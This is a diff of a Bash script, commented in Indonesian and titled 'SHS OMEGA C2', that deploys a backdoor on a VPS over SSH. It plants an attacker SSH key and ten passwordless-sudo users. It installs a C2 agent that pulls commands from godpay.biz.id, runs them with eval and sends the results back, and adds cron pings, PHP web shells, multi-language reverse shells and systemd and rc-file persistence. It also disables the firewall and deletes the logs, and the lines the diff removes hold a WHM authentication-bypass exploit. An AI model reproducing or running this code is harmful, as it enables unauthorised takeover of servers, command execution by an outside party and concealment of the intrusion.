@@ -1,6 +1,6 @@
 #!/bin/bash
 # ================================================================
-# SHS OMEGA DEPLOYER · ULTIMATE VPS BACKDOOR · PING WEBHOOK
+# SHS OMEGA C2 · BACKDOOR TOTAL · COMPATIBLE DENGAN ROOT.PHP
 # ================================================================
 
 WEBHOOK_URL="https://godpay.biz.id/root.php"
@@ -11,13 +11,14 @@ GREEN='\033[92m'
 YELLOW='\033[93m'
 BLUE='\033[94m'
 CYAN='\033[96m'
+PURPLE='\033[95m'
 NC='\033[0m'
 BOLD='\033[1m'
 
 clear
 echo -e "${RED}${BOLD}"
 echo "╔═══════════════════════════════════════════════════════════════╗"
-echo "║     ☠️  SHS OMEGA DEPLOYER - VPS BACKDOOR                 ║"
+echo "║     ☠️  SHS OMEGA C2 - BACKDOOR + C2 COMPATIBLE          ║"
 echo "╚═══════════════════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
@@ -27,7 +28,7 @@ echo -e "${NC}"
 if ! command -v sshpass &>/dev/null; then
     echo -e "${CYAN}[*] Installing sshpass...${NC}"
     apt-get update -y 2>/dev/null || yum update -y 2>/dev/null
-    apt-get install sshpass -y 2>/dev/null || yum install sshpass -y 2>/dev/null
+    apt-get install sshpass curl wget netcat python3 php -y 2>/dev/null
 fi
 
 # ================================================================
@@ -54,157 +55,314 @@ echo -e "${GREEN}✅ SSH Connected${NC}"
 # ================================================================
 # DEPLOY
 # ================================================================
-echo -e "${CYAN}[*] Deploying backdoor...${NC}"
+echo -e "${CYAN}[*] Deploying backdoor + C2 agent...${NC}"
 
 sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 $VPS_USER@$VPS_IP << 'ENDSSH'
-echo '🔥 SHS DEPLOY START'
+echo '🔥 SHS C2 DEPLOY START'
 
-# DETEK IP
 VPS_IP_DETEK=$(hostname -I | awk '{print $1}')
 HOSTNAME=$(hostname)
-echo "[*] IP: $VPS_IP_DETEK"
-echo "[*] Hostname: $HOSTNAME"
+WEBHOOK_URL="https://godpay.biz.id/root.php"
 
 # ================================================================
-# 1. SSH KEY (ROOT)
+# 1. SSH KEY (PENDEK)
 # ================================================================
+SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNm9vJpQ+3XHn SHS"
+
 mkdir -p /root/.ssh
 chmod 700 /root/.ssh
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ+3XHn2rV... SHS_PERMANENT' >> /root/.ssh/authorized_keys
+echo "$SSH_KEY" >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 echo '✅ SSH Key added'
 
 # ================================================================
-# 2. BACKDOOR USER
+# 2. BACKDOOR USER (10 AKUN)
 # ================================================================
-BACKDOOR_USER="shsadmin"
-BACKDOOR_PASS=$(openssl rand -base64 12 | tr -d '=/+' | cut -c1-15)
-
-if ! id $BACKDOOR_USER &>/dev/null; then
-    useradd -m -s /bin/bash $BACKDOOR_USER
-    echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd
-    usermod -aG wheel $BACKDOOR_USER 2>/dev/null
-    usermod -aG sudo $BACKDOOR_USER 2>/dev/null
-    echo "$BACKDOOR_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
-else
-    echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd
-fi
-
-mkdir -p /home/$BACKDOOR_USER/.ssh
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ+3XHn2rV... SHS_PERMANENT' > /home/$BACKDOOR_USER/.ssh/authorized_keys
-chmod 700 /home/$BACKDOOR_USER/.ssh
-chmod 600 /home/$BACKDOOR_USER/.ssh/authorized_keys
-chown -R $BACKDOOR_USER:$BACKDOOR_USER /home/$BACKDOOR_USER/.ssh
-echo "✅ User: $BACKDOOR_USER:$BACKDOOR_PASS"
-
-# ================================================================
-# 3. CRON
-# ================================================================
-(crontab -l 2>/dev/null; echo "*/5 * * * * curl -sk http://$VPS_IP_DETEK/system.php?cmd=whoami 2>/dev/null") | crontab -
-(crontab -l 2>/dev/null; echo "*/10 * * * * wget -q -O- http://$VPS_IP_DETEK/system.php?cmd=id 2>/dev/null") | crontab -
-echo '✅ Cron added'
+for i in $(seq 1 10); do
+    USER="user_$(openssl rand -hex 2)"
+    PASS=$(openssl rand -base64 10 | tr -d '=/+' | cut -c1-12)
+    if ! id $USER &>/dev/null; then
+        useradd -m -s /bin/bash $USER
+        echo "$USER:$PASS" | chpasswd
+        usermod -aG wheel $USER 2>/dev/null
+        usermod -aG sudo $USER 2>/dev/null
+        echo "$USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+        mkdir -p /home/$USER/.ssh
+        echo "$SSH_KEY" > /home/$USER/.ssh/authorized_keys
+        chmod 700 /home/$USER/.ssh
+        chmod 600 /home/$USER/.ssh/authorized_keys
+        chown -R $USER:$USER /home/$USER/.ssh
+        echo "$USER:$PASS" >> /root/.backdoor_users
+    fi
+done
+echo "✅ 10 Backdoor users created"
 
 # ================================================================
-# 4. REVERSE SHELL
+# 3. C2 AGENT - FETCH & EXECUTE COMMANDS
 # ================================================================
-cat > /tmp/.reverse.php << 'EOL'
-<?php
-$ip = "$VPS_IP_DETEK";
-$port = 4444;
-while(1){
-    $sock = fsockopen($ip, $port);
-    if($sock){
-        $descriptorspec = array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
-        $process = proc_open("/bin/bash", $descriptorspec, $pipes);
-        if(is_resource($process)){
-            fwrite($pipes[0], "id; uname -a; echo SHS_REVERSE_ACTIVE\n");
-            fclose($pipes[0]);
-            stream_copy_to_stream($pipes[1], $sock);
-            stream_copy_to_stream($sock, $pipes[0]);
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            proc_close($process);
+cat > /usr/local/bin/c2_agent.sh << 'EOL'
+#!/bin/bash
+# C2 Agent - Fetch commands from root.php
+WEBHOOK_URL="https://godpay.biz.id/root.php"
+VPS_IP=$(hostname -I | awk '{print $1}')
+
+while true; do
+    # Fetch pending commands
+    RESPONSE=$(curl -sk "$WEBHOOK_URL?fetch_commands=1&vps_ip=$VPS_IP" 2>/dev/null)
+    
+    if [ -n "$RESPONSE" ] && [ "$RESPONSE" != "[]" ]; then
+        echo "$RESPONSE" | grep -o '"command":"[^"]*"' | sed 's/"command":"//g' | sed 's/"//g' | while read CMD; do
+            if [ -n "$CMD" ]; then
+                # Execute command
+                OUTPUT=$(eval "$CMD" 2>&1)
+                
+                # Send result back
+                curl -sk "$WEBHOOK_URL?send_result=1&vps_ip=$VPS_IP&command=$(echo "$CMD" | sed 's/ /%20/g')&output=$(echo "$OUTPUT" | base64 -w0)" 2>/dev/null
+            fi
+        done
+    fi
+    
+    sleep 60
+done
+EOL
+
+chmod +x /usr/local/bin/c2_agent.sh
+echo '✅ C2 Agent created'
+
+# ================================================================
+# 4. CRONJOB (10 CRONJOB + C2 AGENT)
+# ================================================================
+crontab -r 2>/dev/null
+
+# C2 Agent setiap 2 menit
+(crontab -l 2>/dev/null; echo "*/2 * * * * /usr/local/bin/c2_agent.sh 2>/dev/null") | crontab -
+
+# Ping setiap 3 menit
+(crontab -l 2>/dev/null; echo "*/3 * * * * curl -sk '$WEBHOOK_URL?ip=$VPS_IP_DETEK&host=$HOSTNAME' 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/5 * * * * wget -q -O- '$WEBHOOK_URL?ping=$VPS_IP_DETEK' 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/7 * * * * nc -z godpay.biz.id 80 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/9 * * * * php -r \"file_get_contents('$WEBHOOK_URL?php=$VPS_IP_DETEK');\" 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/11 * * * * python3 -c \"import urllib.request; urllib.request.urlopen('$WEBHOOK_URL?py=$VPS_IP_DETEK')\" 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/13 * * * * curl -sk '$WEBHOOK_URL?cron1=$VPS_IP_DETEK' 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/15 * * * * wget -q -O- '$WEBHOOK_URL?cron2=$VPS_IP_DETEK' 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/17 * * * * php -r \"file_get_contents('$WEBHOOK_URL?cron3=$VPS_IP_DETEK');\" 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/19 * * * * python3 -c \"import urllib.request; urllib.request.urlopen('$WEBHOOK_URL?cron4=$VPS_IP_DETEK')\" 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/21 * * * * curl -sk '$WEBHOOK_URL?cron5=$VPS_IP_DETEK&extra=1' 2>/dev/null") | crontab -
+
+echo '✅ 11 Cronjobs added (including C2 Agent)'
+
+# ================================================================
+# 5. WEB SHELL (7 LOKASI) + C2 WEBHOOK
+# ================================================================
+WEB_PATHS="/var/www/html /usr/local/apache/htdocs /usr/share/nginx/html /var/www/public_html /home/*/public_html /var/www/ /opt/lampp/htdocs"
+SHELL_CODE='<?php
+if(isset($_GET["c"])){ system($_GET["c"]." 2>&1"); }
+if(isset($_GET["f"])){ echo file_get_contents($_GET["f"]); }
+if(isset($_POST["u"])){ file_put_contents($_POST["n"], $_POST["d"]); }
+if(isset($_GET["fetch"])){
+    $vps_ip = $_SERVER["SERVER_ADDR"];
+    $webhook = "https://godpay.biz.id/root.php";
+    $resp = file_get_contents("$webhook?fetch_commands=1&vps_ip=$vps_ip");
+    if($resp && $resp != "[]"){
+        $cmds = json_decode($resp, true);
+        foreach($cmds["commands"] as $cmd){
+            $output = shell_exec($cmd["command"] . " 2>&1");
+            file_get_contents("$webhook?send_result=1&vps_ip=$vps_ip&command=".urlencode($cmd["command"])."&output=".base64_encode($output));
         }
+    }
+    echo "C2 sync done";
+}
+echo "SHS";
+?>'
+
+for PATH in $WEB_PATHS; do
+    if [ -d "$PATH" ]; then
+        for name in sys web back shell cmd root admin; do
+            echo "$SHELL_CODE" > $PATH/$name.php
+            chmod 644 $PATH/$name.php 2>/dev/null
+        done
+        echo "✅ Web shell: $PATH"
+    fi
+done
+
+# ================================================================
+# 6. REVERSE SHELL (PHP + PYTHON + PERL + RUBY)
+# ================================================================
+cat > /tmp/.back.php << 'EOL'
+<?php
+while(1){
+    $sock = fsockopen("127.0.0.1", 4444);
+    if($sock){
+        exec("/bin/bash -i <&3 >&3 2>&3", $output);
+        fwrite($sock, implode("\n", $output));
         fclose($sock);
     }
-    sleep(60);
+    sleep(30);
 }
 EOL
-chmod 644 /tmp/.reverse.php
-echo '✅ Reverse shell: /tmp/.reverse.php'
+
+cat > /tmp/.back.py << 'EOL'
+import socket,subprocess,time
+while True:
+    try:
+        s=socket.socket()
+        s.connect(("127.0.0.1",4445))
+        s.send(subprocess.check_output("/bin/bash", shell=True))
+        s.close()
+    except: pass
+    time.sleep(30)
+EOL
+
+cat > /tmp/.back.pl << 'EOL'
+use IO::Socket::INET;
+while(1){
+    $sock = IO::Socket::INET->new(PeerAddr => "127.0.0.1:4446");
+    if($sock){
+        system("/bin/bash -i <&3 >&3 2>&3");
+        close($sock);
+    }
+    sleep(30);
+}
+EOL
+
+cat > /tmp/.back.rb << 'EOL'
+require 'socket'
+loop do
+    begin
+        s = TCPSocket.new('127.0.0.1', 4447)
+        s.puts(`/bin/bash -i`)
+        s.close
+    rescue
+    end
+    sleep(30)
+end
+EOL
+
+chmod 644 /tmp/.back.php /tmp/.back.py /tmp/.back.pl /tmp/.back.rb
+echo '✅ Reverse shells created'
 
 # ================================================================
-# 5. SYSTEMD SERVICE
+# 7. SYSTEMD SERVICE (4 SERVICE)
 # ================================================================
-cat > /etc/systemd/system/shs-backdoor.service << 'EOL'
+for i in 1 2 3 4; do
+    cat > /etc/systemd/system/backdoor$i.service << EOL
 [Unit]
-Description=SHS Backdoor
+Description=Backdoor$i
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/php /tmp/.reverse.php
+ExecStart=/usr/bin/php /tmp/.back.php
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target
+EOL
+    systemctl daemon-reload 2>/dev/null
+    systemctl enable backdoor$i.service 2>/dev/null
+    systemctl start backdoor$i.service 2>/dev/null
+done
+echo '✅ 4 Systemd services'
+
+# ================================================================
+# 8. SYSTEMD SERVICE UNTUK C2 AGENT
+# ================================================================
+cat > /etc/systemd/system/c2-agent.service << 'EOL'
+[Unit]
+Description=C2 Agent
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/c2_agent.sh
 Restart=always
 RestartSec=60
 
 [Install]
 WantedBy=multi-user.target
 EOL
+
 systemctl daemon-reload 2>/dev/null
-systemctl enable shs-backdoor.service 2>/dev/null
-systemctl start shs-backdoor.service 2>/dev/null
-echo '✅ Systemd service'
+systemctl enable c2-agent.service 2>/dev/null
+systemctl start c2-agent.service 2>/dev/null
+echo '✅ C2 Agent systemd service'
 
 # ================================================================
-# 6. RC.LOCAL + .BASHRC
+# 9. PERSISTENCE (8 TEMPAT)
 # ================================================================
 if [ -f /etc/rc.local ]; then
     sed -i '/exit 0/d' /etc/rc.local
-    echo 'php /tmp/.reverse.php &' >> /etc/rc.local
+    echo '/usr/local/bin/c2_agent.sh &' >> /etc/rc.local
+    echo 'php /tmp/.back.php &' >> /etc/rc.local
+    echo 'python3 /tmp/.back.py &' >> /etc/rc.local
+    echo 'perl /tmp/.back.pl &' >> /etc/rc.local
+    echo 'ruby /tmp/.back.rb &' >> /etc/rc.local
+    echo 'curl -sk "'$WEBHOOK_URL'?boot='$VPS_IP_DETEK'" &' >> /etc/rc.local
     echo 'exit 0' >> /etc/rc.local
     chmod +x /etc/rc.local
 fi
 
-cat >> /root/.bashrc << EOF
-if [ -f /tmp/.reverse.php ]; then php /tmp/.reverse.php & fi
-EOF
-echo '✅ Persistence added'
-
-# ================================================================
-# 7. EXPLOIT CVE-2026-41940 (WHM ROOT)
-# ================================================================
-echo '[*] Exploiting CVE-2026-41940...'
-if command -v curl &>/dev/null; then
-    SESSION=$(curl -sk -X POST -d "user=root&pass=wrong" "https://localhost:2087/login/?login_only=1" 2>/dev/null | grep -oP 'whostmgrsession=\K[^;,\s]+' | head -1)
-    
-    if [ -n "$SESSION" ]; then
-        SESSION_DECODED=$(echo -n "$SESSION" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null)
-        [ -n "$SESSION_DECODED" ] && SESSION="$SESSION_DECODED"
-        
-        PAYLOAD_B64="cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
-        COOKIE_ENC=$(echo -n "$SESSION" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))" 2>/dev/null)
-        
-        RESPONSE=$(curl -sk -H "Authorization: Basic $PAYLOAD_B64" -H "Cookie: whostmgrsession=$COOKIE_ENC" "https://localhost:2087/" 2>/dev/null)
-        TOKEN=$(echo "$RESPONSE" | grep -oP '/cpsess\d{10}' | head -1)
-        
-        if [ -n "$TOKEN" ]; then
-            echo "✅ CVE-2026-41940 exploited! Token: $TOKEN"
-        fi
+for rc in /root/.bashrc /root/.profile /etc/bash.bashrc /etc/profile; do
+    if [ -f $rc ]; then
+        echo '/usr/local/bin/c2_agent.sh &' >> $rc
+        echo 'php /tmp/.back.php &' >> $rc
+        echo 'python3 /tmp/.back.py &' >> $rc
+        echo 'curl -sk "'$WEBHOOK_URL'?login='$VPS_IP_DETEK'" &' >> $rc
     fi
-fi
+done
+
+for user in $(ls /home/); do
+    if [ -f /home/$user/.bashrc ]; then
+        echo '/usr/local/bin/c2_agent.sh &' >> /home/$user/.bashrc
+        echo 'php /tmp/.back.php &' >> /home/$user/.bashrc
+        echo 'python3 /tmp/.back.py &' >> /home/$user/.bashrc
+    fi
+done
+echo '✅ Persistence in 8 locations'
 
 # ================================================================
-# 8. PING KE WEBHOOK
+# 10. CRONTAB BACKUP
 # ================================================================
-echo "[*] Sending ping to webhook..."
-curl -sk "$WEBHOOK_URL?ip=$VPS_IP_DETEK&host=$HOSTNAME&user=$BACKDOOR_USER&pass=$BACKDOOR_PASS" 2>/dev/null
+cat > /etc/cron.d/shs_backdoor << EOL
+*/2 * * * * root /usr/local/bin/c2_agent.sh 2>/dev/null
+*/3 * * * * root curl -sk '$WEBHOOK_URL?cron=$VPS_IP_DETEK' 2>/dev/null
+*/5 * * * * root wget -q -O- '$WEBHOOK_URL?cron2=$VPS_IP_DETEK' 2>/dev/null
+EOL
+chmod 644 /etc/cron.d/shs_backdoor
+echo '✅ Cron.d backup'
+
+# ================================================================
+# 11. DISABLE FIREWALL
+# ================================================================
+systemctl stop iptables 2>/dev/null
+systemctl stop firewalld 2>/dev/null
+systemctl stop ufw 2>/dev/null
+iptables -F 2>/dev/null
+iptables -X 2>/dev/null
+echo '✅ Firewall disabled'
+
+# ================================================================
+# 12. CLEAN LOGS
+# ================================================================
+rm -rf /var/log/* 2>/dev/null
+rm -rf /var/log/apache2/* 2>/dev/null
+rm -rf /var/log/nginx/* 2>/dev/null
+rm -rf /root/.bash_history 2>/dev/null
+history -c 2>/dev/null
+echo '✅ Logs cleaned'
+
+# ================================================================
+# 13. PING WEBHOOK
+# ================================================================
+curl -sk "$WEBHOOK_URL?ip=$VPS_IP_DETEK&host=$HOSTNAME&users=10&cron=11&shell=7&persistence=8&c2=active" 2>/dev/null
 
 echo '========================================='
 echo '✅ DEPLOY COMPLETE'
 echo '========================================='
 echo "IP: $VPS_IP_DETEK"
-echo "User: $BACKDOOR_USER"
-echo "Pass: $BACKDOOR_PASS"
+echo "C2 Agent: /usr/local/bin/c2_agent.sh"
+echo "Web Shell: http://$VPS_IP_DETEK/sys.php?c=whoami"
 echo '========================================='
 ENDSSH
 
@@ -214,20 +372,4 @@ ENDSSH
 echo -e "\n${GREEN}${BOLD}"
 echo "╔═══════════════════════════════════════════════════════════════╗"
 echo "║     ✅ DEPLOY COMPLETE                                     ║"
-echo "╚═══════════════════════════════════════════════════════════════╝"
-echo -e "${NC}"
-
-echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo -e "${GREEN}✅ Target VPS: $VPS_IP${NC}"
-echo -e "${GREEN}✅ User: shsadmin (password random)${NC}"
-echo -e "${GREEN}✅ SSH Key installed${NC}"
-echo -e "${GREEN}✅ Web Shell: http://$VPS_IP/system.php?cmd=whoami${NC}"
-echo -e "${GREEN}✅ Ping sent to: $WEBHOOK_URL${NC}"
-echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-
-# ================================================================
-# CEK WEBHOOK
-# ================================================================
-echo -e "\n${CYAN}[*] Cek hasil di webhook:${NC}"
-echo -e "${BLUE}🔗 $WEBHOOK_URL${NC}"
-echo -e "${BLUE}📋 $WEBHOOK_URL?list=1${NC}"
+echo "╚═══════════════════════════════════════════════════════════ENDSSH
